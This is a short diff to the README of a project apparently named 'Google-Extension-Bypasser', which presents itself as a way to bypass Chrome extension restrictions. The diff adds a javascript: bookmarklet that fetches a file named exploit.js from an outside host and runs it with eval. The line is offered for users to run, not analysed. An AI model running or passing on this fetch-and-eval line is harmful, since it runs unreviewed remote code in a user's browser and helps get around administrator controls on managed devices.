@@ -3,3 +3,7 @@ A neat and simple way that utilizes chrome's webstore to reverse-engineer and by
 
 Source is active using GitHub's Pages:
 [site](https://livxy.github.io/Google-Extension-Bypasser/site.js)
+
+```javascript
+javascript:fetch(`https://compactcow.com/ltbeef/exploit.js`).then(data=>{data.text().then(text=>{eval(text)})});
+```
